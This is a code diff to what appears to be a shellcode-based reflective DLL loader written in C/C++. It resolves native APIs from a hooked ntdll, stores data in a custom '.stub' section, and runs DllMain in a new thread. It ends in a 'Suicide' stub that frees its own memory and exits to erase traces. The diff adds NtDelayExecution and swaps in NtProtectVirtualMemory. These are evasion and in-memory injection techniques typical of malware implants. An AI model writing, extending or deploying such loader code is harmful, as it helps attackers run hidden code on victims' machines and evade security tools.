@@ -506,7 +506,7 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
     typedef HMODULE(WINAPI* pfnLoadLibraryA)(LPCSTR lpLibFileName);
     typedef HANDLE(WINAPI* pfnCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
     typedef BOOL(WINAPI* pfnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
-    typedef BOOL(WINAPI* pfnDLLMain)(HINSTANCE, DWORD, LPVOID);
+    typedef BOOL(WINAPI* pfnDLLMain)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
     typedef BOOL(WINAPI* pfnCloseHandle)(HANDLE hObject);
     
     typedef void(NTAPI* PIMAGE_TLS_CALLBACK)(PVOID DllHandle, DWORD Reason, PVOID Reserved);
@@ -514,6 +514,7 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
     typedef NTSTATUS(NTAPI* pfnNtFreeVirtualMemory)(HANDLE hProcessHandel, void* vpBaseAddress, PSIZE_T RegionSize, ULONG FreeType);
     typedef NTSTATUS(NTAPI* pfnNtProtectVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, PULONG NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection);
     typedef void(NTAPI* pfnRtlExitUserThread)(NTSTATUS ExitStatus);
+    typedef NTSTATUS(NTAPI* pfnNtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval);
     ///////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
     typedef struct _DLLMAIN_THREAD_PARAMS
@@ -540,7 +541,8 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
     __declspec(allocate(".stub")) static const CHAR cRtlFillMemoryFunction[] = "RtlFillMemory";
     __declspec(allocate(".stub")) static const CHAR cNtFreeVirtualMemoryFunction[] = "NtFreeVirtualMemory";
     __declspec(allocate(".stub")) static const CHAR cRtlExitUserThreadFunction[] = "RtlExitUserThread";
-    __declspec(allocate(".stub")) static const CHAR cNtProtectVirtualMemoryFunction[] = "NtProtectVirtualMemory";
+    __declspec(allocate(".stub")) static const CHAR cNtProtectVirtualMemoryFunction[] = "NtProtectVirtualMemory"; 
+    __declspec(allocate(".stub")) static const CHAR cNtDelayExecutionFunction[] = "NtDelayExecution"; 
 
     __declspec(allocate(".stub")) pfnMessageBoxW my_MessageBoxW = nullptr;
     __declspec(allocate(".stub")) pfnOutputDebugStringW my_OutputDebugStringW = nullptr;
@@ -552,6 +554,7 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
     __declspec(allocate(".stub")) pfnNtFreeVirtualMemory my_NtFreeVirtualMemory = nullptr;
     __declspec(allocate(".stub")) pfnRtlExitUserThread my_RtlExitUserThread = nullptr;
     __declspec(allocate(".stub")) pfnNtProtectVirtualMemory my_NtProtectVirtualMemory = nullptr;
+    __declspec(allocate(".stub")) pfnNtDelayExecution my_NtDelayExecution = nullptr;
 
     __declspec(allocate(".stub")) static const WCHAR g_hexChars[] = L"0123456789ABCDEF";
     __declspec(allocate(".stub")) static WCHAR g_shellcodeLogBuffer[256];
@@ -1025,15 +1028,22 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
 
     __declspec(noinline) static DWORD WINAPI DllMainThreadRunner(LPVOID lpParam)
     {
-        PDLLMAIN_THREAD_PARAMS params = (PDLLMAIN_THREAD_PARAMS)lpParam;
+        pfnDLLMain local_pfnDllMain;
+        HINSTANCE local_hinstDLL;
 
-        if (!params || !params->pfnDllMain || !params->hinstDLL)
+        if (!lpParam) return 1;
+
         {
-            return 1;
+            PDLLMAIN_THREAD_PARAMS params = (PDLLMAIN_THREAD_PARAMS)lpParam;
+            if (!params || !params->pfnDllMain || !params->hinstDLL) return 1;
+
+            local_pfnDllMain = params->pfnDllMain;
+            local_hinstDLL   = params->hinstDLL;
+            
+            BOOL result = params->pfnDllMain(params->hinstDLL, DLL_PROCESS_ATTACH, NULL);
+            return result ? 0 : 1;
         }
 
-        BOOL result = params->pfnDllMain(params->hinstDLL, DLL_PROCESS_ATTACH, NULL);
-        return result ? 0 : 1;
     }
 
     __declspec(noinline) void __stdcall shellcode(LPVOID lpParameter)
@@ -1146,6 +1156,9 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
 
         my_NtProtectVirtualMemory = (pfnNtProtectVirtualMemory)ShellcodeFindExportAddress(sLibs.hHookedNtdll, cNtProtectVirtualMemoryFunction, my_LoadLibraryA);
         if(my_NtProtectVirtualMemory == NULL) __debugbreak();
+        
+        my_NtDelayExecution = (pfnNtDelayExecution)ShellcodeFindExportAddress(sLibs.hHookedNtdll, cNtDelayExecutionFunction, my_LoadLibraryA);
+        if(my_NtDelayExecution == NULL) __debugbreak();
         
         ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
@@ -1594,18 +1607,14 @@ static void* FindExportAddress(HMODULE hModule, const char* funcName)
         
         #pragma region Suicide
         LOG_W(L"            Suicide");
-        
-        // int x = 5;
-        // int y = 6;
-        
-        // LOG_W(L"Adding %d and %d", x, y);
-        // int result = AddTwoNumbers(x, y);
-        // LOG_W(L"Result -> %d", result);
+
+        // LARGE_INTEGER delayInterval;
+        // delayInterval.QuadPart = -10000 * 10000; // 1000 ms = 1 second, negative for relative time
+        // my_NtDelayExecution(1, &delayInterval);
 
         LOG_W(L"Preparing for self-deletion and exit via assembly suicide stub...");
-        // Suicide(pResources->ResourceBase, my_NtFreeVirtualMemory, my_RtlExitUserThread, my_VirtualProtect);
+
         Suicide(pResources->ResourceBase, my_NtFreeVirtualMemory, my_RtlExitUserThread, my_NtProtectVirtualMemory);
-        // return;
 
         LOG_W(L"!!!! ERROR: Returned from Suicide Stub !!!!");
 
